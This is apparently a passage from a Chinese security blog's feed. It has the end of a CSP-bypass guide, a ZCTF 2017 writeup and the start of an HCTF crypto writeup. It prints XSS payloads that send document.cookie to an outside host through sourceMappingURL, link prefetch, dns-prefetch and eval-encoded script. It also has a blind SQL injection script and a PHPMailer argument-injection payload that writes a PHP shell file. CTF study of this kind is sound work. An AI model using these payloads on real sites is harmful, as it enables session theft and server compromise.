class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">)</span><br><span class="line">eval</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">href</span><br><span class="line">window</span><br><span class="line">src</span><br><span class="line">svg</span><br><span class="line">img</span><br></pre></td></tr></table></figure><p>这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的 Twitter 中的一个 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;//# sourceMappingURL=https://xxx.com/?$&#123;escape(document.cookie)&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>因为我们不用获取 Cookie，所以完全可以实现我们的要求<br>PS：//# sourceMappingURL 是用来请求一个 .map 文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试</p><p>还有就是这个指令值出现在 style-src 中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p><p>比如上次 Pwnhub 蓝猫师傅出的一道题 <code>打开电脑</code>， CSP 是长这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src *; img-src * data: blob:; frame-src &apos;self&apos;; script-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-eval&apos;; style-src &apos;self&apos; cdn.bootcss.com &apos;unsafe-inline&apos;; connect-src * wss:;</span><br></pre></td></tr></table></figure></p><p>我们可以提交一条 md5 值，后台显示方式和前段差不多，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;modal&quot; class=&quot;detail&quot; href=&quot;#detail&quot; data-toggle=&quot;modal&quot; contributor=aaangelwhu hexdata=672e65613167722e333170366572657265726572657265&gt;fffffffffffe53cdbc640fffb934cfb8&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>因为有 htmlspecialchars，对 <code>&lt;</code> <code>&quot;</code> 进行了转义，即我们跳不出这个标签，所以不能用 script 标签，但是我们注意到 hexdata 是没有引号的，而且这个字段又是我们可控的，结合 style-src 的 unsafe-inline 值，可以在标签内使用内联样式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">233 style=background-image:url(http://xxx.com)</span><br><span class="line">233 style=background:url(http://xxx.com)</span><br></pre></td></tr></table></figure></p><p>background-image 属性是用来为元素设置背景图像的</p><h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;</span><br></pre></td></tr></table></figure><p>当上面的 unsafe-inline 和 unsafe-eval 都开启时，将会变得很危险<br>因为你过滤的一些关键字都可以用 eval 函数来绕过，比如<br>我们先对最基本的 payload 用 String.fromCharCode 函数来处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.location=http://xxx.com+document.cookie</span><br><span class="line">String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101)</span><br></pre></td></tr></table></figure></p><p>再用 eval 函数执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 104, 116, 116, 112, 58, 47, 47, 120, 120, 120, 46, 99, 111, 109, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>这样就避开了很多关键字，当然不保证会直接过滤掉 eval</p><h4 id="Link-Prefetch"><a href="#Link-Prefetch" class="headerlink" title="Link Prefetch"></a>Link Prefetch</h4><p>在 HTML5 中有一个新特性，<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ" target="_blank" rel="external">Link Prefetch</a>(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度<br>官方的定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link prefetching is a browser mechanism, which utilizes browser idle time to download or prefetch documents that the user might visit in the near future. A web page provides a set of prefetching hints to the browser, and after the browser is finished loading the page, it begins silently prefetching specified documents and stores them in its cache. When the user visits one of the prefetched documents, it can be served up quickly out of the browser&apos;s cache.</span><br></pre></td></tr></table></figure></p><p>下面就说下几种可以实现预加载的方式</p><h5 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a><strong>prefetch</strong></h5><p>一般是通过 link 标签来实现预加载的指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p><p>如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var i=document.createElement(&apos;link&apos;);</span><br><span class="line">i.setAttribute(&apos;rel&apos;,&apos;prefetch&apos;);</span><br><span class="line">i.setAttribute(&apos;href&apos;,&apos;http://xxx.com?&apos;+document.cookie);</span><br><span class="line">document.head.appendChild(i);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h5 id="dns-prefetch"><a href="#dns-prefetch" class="headerlink" title="dns-prefetch"></a><strong>dns-prefetch</strong></h5><p>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>同样想要在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p><p>这种情况下收获 Cookie 的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    dcl = document.cookie.split(&quot;;&quot;);</span><br><span class="line">    n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0];</span><br><span class="line"></span><br><span class="line">    for (var i=0; i&lt;dcl.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(dcl[i]);</span><br><span class="line">        n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot; + escape(dcl[i].replace(/\//g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/\./g, &quot;-&quot;) +  &quot;.wb7g7z.ceye.io\&quot;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换</p><p>然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个<a href="http://ceye.io" target="_blank" rel="external">平台</a></p><h5 id="preconnect"><a href="#preconnect" class="headerlink" title="preconnect"></a><strong>preconnect</strong></h5><p>preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商</p><p>利用方式和上面类似</p><h5 id="preload"><a href="#preload" class="headerlink" title="preload"></a><strong>preload</strong></h5><p>preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源</p><p>和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; connect-src *;</span><br></pre></td></tr></table></figure></p><p>然后就是和上面类似的 payload 了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"preload"</span> <span class="attr">href</span>=<span class="string">http://xxx.com</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h5 id="prerender"><a href="#prerender" class="headerlink" title="prerender"></a><strong>prerender</strong></h5><p>测试了下好像已经不行了，没有 CSP 头也不行</p><h4 id="302-Redirect-Bypass"><a href="#302-Redirect-Bypass" class="headerlink" title="302 Redirect Bypass"></a>302 Redirect Bypass</h4><p>很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接<br>在 PHP 中一般这样来实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">'Location: http://xxx.com'</span>);</span><br></pre></td></tr></table></figure></p><p>我们看下官方的<a href="https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects" target="_blank" rel="external">说明</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4.2.2.3. Paths and Redirects</span><br><span class="line"></span><br><span class="line">To avoid leaking path information cross-origin (as discussed in Egor Homakov’s Using Content-Security-Policy for Evil), the matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect. For example, given a page with an active policy of img-src example.com not-example.com/path:</span><br><span class="line"></span><br><span class="line">Directly loading https://not-example.com/not-path would fail, as it doesn’t match the policy.</span><br><span class="line">Directly loading https://example.com/redirector would pass, as it matches example.com.</span><br><span class="line">Assuming that https://example.com/redirector delivered a redirect response pointing to https://not-example.com/not-path, the load would succeed, as the initial URL matches example.com, and the redirect target matches not-example.com/path if we ignore its path component.</span><br></pre></td></tr></table></figure></p><p>也就是说只要产生跳转的页面在 CSP 下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的</p><p>参考链接: <a href="https://xianzhi.aliyun.com/forum/read/523.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/523.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下&lt;/p&gt;
&lt;h3 id=&quot;What-is-CSP&quot;&gt;&lt;a href=&quot;#What-is-CSP&quot; class=&quot;headerlink&quot; title=&quot;What is CSP?&quot;&gt;&lt;/a&gt;What is CSP
      
    
    </summary>
    
    
      <category term="XSS" scheme="http://heartsky.info/tags/XSS/"/>
    
      <category term="CSP" scheme="http://heartsky.info/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>ZCTF 2017 writeup</title>
    <link href="http://heartsky.info/2017/03/02/ZCTF-2017-writeup/"/>
    <id>http://heartsky.info/2017/03/02/ZCTF-2017-writeup/</id>
    <published>2017-03-02T03:44:19.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web100-100"><a href="#web100-100" class="headerlink" title="web100 - 100"></a>web100 - 100</h3><blockquote><p>简单点<br><a href="http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/" target="_blank" rel="external">http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/</a></p></blockquote><p>打开后只显示了 ha?，没有任何功能。猜测是有备份文件泄露，试了下 <code>.index.php.swp</code>，得到了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = $_GET[<span class="string">'flag'</span>];</span><br><span class="line"><span class="keyword">if</span> ($flag != <span class="string">'15562'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strstr($flag, <span class="string">'zctf'</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(md5($flag),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'ZCTF&#123;#########&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'ha?'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>简单的 md5 爆破，因为 <code>substr(md5(&#39;15562&#39;),8,16)</code> 是以 0e 开头的，所以只要保证我们的中间的这几位 md5 值是 0e 开头，后面的都是数字即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    s = <span class="string">'zctf'</span> + str(i)</span><br><span class="line">    md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">    h = md5[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> md5[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">            <span class="keyword">if</span> j.isalpha():</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> s</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="Find-my-eyes-100"><a href="#Find-my-eyes-100" class="headerlink" title="Find my eyes - 100"></a>Find my eyes - 100</h3><p>打开后是一个不知道什么 cms 的站，发表评论什么的功能都是假的，只有 contact.php 可以，然后结合响应头中有 CSP 头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p><p>猜测可能是盲打 XSS<br>这个表单有 Name Email Team textarea 字段，刚开始一直在尝试 textarea 字段，发现基本上关键字都被过滤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">href</span><br><span class="line">window</span><br><span class="line">src</span><br><span class="line">svg</span><br><span class="line">img</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">括号</span><br></pre></td></tr></table></figure></p><p>没找到方法绕过，又去看 Name 和 Team 字段，虽然没有这些过滤，但怎么也收不到请求，猜测后台只获取了 textarea 字段的值并显示了出来，那么 payload 还是在 textarea 字段里，最后找到了一个长短短的 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">//@ sourceMappingURL=http://xxx.com</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>PS: <code>//@ sourceMappingURL=xxx.map</code> 是用来启用 Source map 的，而 Source map 是用来代码出错时显示原始代码而不是转换(压缩、多个文件合并、其他语言编译成 JS)后的代码，方便开发者调试<br>参考链接： <a href="http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html</a></p><p>PS2: <code>//@ sourceMappingURL=xxx.map</code> 已弃用，代替为 <code>//# sourceMappingURL=xxx.map</code></p><h3 id="easy-apk-200"><a href="#easy-apk-200" class="headerlink" title="easy apk - 200"></a>easy apk - 200</h3><p>下载后是一个 APK，逆向队友反汇编出客户端源码，是请求了 / 和 /mail.php 这两个地址，猜测是要先登录再发送邮件什么的<br>手机抓包看到登录的用户名和密码进行了加密，然后队友给了加密算法，开始尝试都是返回 <code>{&quot;result&quot;:&quot;no&quot;,&quot;username&quot;:&quot;&quot;}</code>，试了下 sql 注入，结果发现返回了 <code>{&quot;result&quot;:&quot;hacked&quot;,&quot;username&quot;:&quot;&quot;}</code>，说明是有过滤的，那么肯定就是 sql 注入获取 admin 的密码然后再登录 mail.php进行下一步<br>测试得到过滤了这些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">)</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">union select</span><br><span class="line">from</span><br><span class="line">password</span><br></pre></td></tr></table></figure></p><p>值得注意的是 union 和 select 单独出现都是可以的，但一起出现就 GG 了，起初用 /**/ 替换之间的空格发现还是被过滤，就以为是 union select 不能同时出现的，是绕不过的，想要盲注，可是没有括号想了很久都没想到，因为是函数的话都要用到括号。明天起来发现土师傅绕过了union select<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union distinct select</span><br></pre></td></tr></table></figure></p><p>这样就是可以的，那么后台的过滤应该是 union 和 select 之间没有字母数字的话就会被拦截。<br>PS：加上 distinct 和不加是对查询结果没有影响的，都会对结果去重，而另一个 <code>union all select</code> 则是不去重，显示所有结果<br>然后我们的目标就是获得 admin 的密码进行登陆了，因为 password 被拦了，所以这里只能盲注。利用 order by 的特性，如果我们根据 password 那一列对数据进行排序，如果我们选取的字符大于 password 中对应的字符，并且是在降序排序的情况下，第二条查询结果就会显示<br>写个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(name)</span>:</span> </span><br><span class="line">    key = <span class="string">"1470"</span>*<span class="number">100</span></span><br><span class="line">    name =  <span class="string">''</span>.join(reversed(list(name)))</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(name)):</span><br><span class="line">        tmp.append(hex(ord(name[i])^ord(key[i]))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    enc = <span class="string">''</span>.join(tmp)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            name = <span class="string">"admin' union distinct select 1,'test','"</span> + password + chr(j) + <span class="string">"' order by 3 desc#"</span></span><br><span class="line">            enc = encrypt(name)</span><br><span class="line">            payload = &#123;<span class="string">'username'</span>:enc, <span class="string">'password'</span>:<span class="number">111</span>&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://58.213.63.30:10005'</span>, data=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                password += chr(j<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">print</span> password</span><br><span class="line">                <span class="keyword">break</span>           </span><br><span class="line"></span><br><span class="line"><span class="comment"># print encrypt("admin' union distinct select 0,2,3 order by 1 asc#")</span></span><br><span class="line">getPassword()</span><br></pre></td></tr></table></figure></p><p>得到密码 5AF1AB27B1BE8BB8E39BDF98CD2CFCE4<br>md5 查一下为 CleverBoy123<br>然后进行加密就可以登陆了，这也就解释了前面为什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;||1#</span><br></pre></td></tr></table></figure></p><p>返回的是 <code>{&quot;result&quot;:&quot;no&quot;,&quot;username&quot;:&quot;admin&quot;}</code> 了，第一次查询 where 条件是 username 和 password 的联合，绕过，为 admin，但后面又对密码的 md5 值进行了检测，所以 result 为 no</p><p>第二步是发送邮件，联想到之前 PHPMailer 的 CVE，利用 sendmail 写入 log 的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -X/var/www/html/upload/test.php -OQueueDirectory=/tmp )@qq.com</span><br></pre></td></tr></table></figure></p><p>get flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Russian-zips-300"><a href="#Russian-zips-300" class="headerlink" title="Russian zips - 300"></a>Russian zips - 300</h3><p>zip 压缩包伪加密，更改第八位的 01 为 00 即可解密(Linux 直接 binwalk -e 即可)，然后得到一个 .mca 文件，是 mc 的地图文件， 下载个 mc 或者 地图编辑器什么的都可以<br>不懂为啥300分</p><h3 id="Whisper-400"><a href="#Whisper-400" class="headerlink" title="Whisper - 400"></a>Whisper - 400</h3><p>下载后有这些文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint1.png</span><br><span class="line">start here.exe</span><br><span class="line">flag.rar</span><br></pre></td></tr></table></figure></p><p>flag 所在的压缩包被加密过了，先看下 hint1.png，用 stegsolve 可以看到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ron，Adi，Leonard，and don&apos;t forget to check this file carefully</span><br></pre></td></tr></table></figure></p><p>搜了下是 RSA 的三个作者，那么应该是什么东西里有 RSA<br>然后逆向的队友分析了下 start here.exe，得到 n=2344088051，e=65537，然后还有 44 个密文，解密得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint 2: a hidden RAR file, encoded in base64</span><br></pre></td></tr></table></figure></p><p>然后再根据提示1里的仔细检查这个文件，可以看到图片后有一大串 base64，base64 decode 后分离文件<br>然后用 bz2 module 解密就能拿到 flag 了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;web100-100&quot;&gt;&lt;a href=&quot;#web100-100&quot; class=&quot;headerlink&quot; title=&quot;w
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-GAME-week4-writeup</title>
    <link href="http://heartsky.info/2017/02/11/HCTF-GAME-week4-writeup/"/>
    <id>http://heartsky.info/2017/02/11/HCTF-GAME-week4-writeup/</id>
    <published>2017-02-11T15:23:26.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>明天就要坐车回去了，因此就只写下我出的几道 Crypto 吧，PENTEST 和 Misc 的 wp 请关注 <a href="http://c014.cn/" target="_blank" rel="external">C014’s blog</a></p><h3 id="进击的-Crypto-3"><a href="#进击的-Crypto-3" class="headerlink" title="进击的 Crypto [3]"></a>进击的 Crypto [3]</h3><blockquote><p>题目描述： 你知道什么是一次性密码本吗？<br>a5f764be8b5e9e20fe6f95a4282d758d8d14b02522fe9d83adc325432b48533dddff79633e0c874fcc0b9f<br>87f837b4c57a9d26e36dd1c2697d7f8d8710bb2527e8c9a2abc329563a01483993db772d2c07d906c00b9f<br>91e47eafdf789c6fec6495a8616172969117ac6437e8d9e7aace606730524d37ddfd79743e0fca41cd1bcb<br>80ed63b3ce429d3bfd5592e178657b91bd0aad5a27ecd3a0adc52f552c5c6f3190d16f2d1417cf008511cc<br>c6f737b3c27a9a6ffe6999e767613e878717bb6637e4cba2e8c0284f7f524a3598c87f603a118b18ca0ad4<br>95b660b2df75d23be56fd1f8676177808743aa6a63fed2abbed260433e52402bd3fb79623b42c71ac61391<br>Hint: 1、题目已经重新出了(包括所有密文)<br>2、flag格式：hctf{[a-z_]+}</p></blockquote><p>我们知道 $m_1\ xor\ key = c_1$，$m_2\ xor\ key = c_2$，所以 $c_1\ xor\ c_2 = m_1\ xor\ m_2$，进而 $c_1\ xor\ c_2\ xor\ m_1 = m_2$，我们知道某段肯定存在的明文 <code>hctf{</code>，把它当做 $m_1$，从初始位置开始尝试，这里题目可能有个小坑，加密后的 flag 不在同一行密文中，而是分割在了两行中，不过也比较容易发现，最后会得到第三行信息的最后三个字符是 <code>hct</code>，第四行的前两个字符是 <code>f{</code>，由此可以得知部分密钥，然后我们知道除 flag 外的明文的格式是 <code>[a-zA-Z,. ]+</code>，由此我们可以运用 Crib-dragging 方法，爆破 <code>f{</code> 后面的明文，如果有解出的其他部分的明文不符合此格式则舍弃，在这里我只取只有一个结果的，得到的明文是 <code>f{the-o----iph---i-_---------}--m----udo--s</code>，- 代表不确定元素，由这个异或出的密钥来解密密文，根据解密出的密文，再猜测一些单词，如此反复，最终便能解密出整个密文，脚本比较乱，需要半手动，看懂思想即可<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 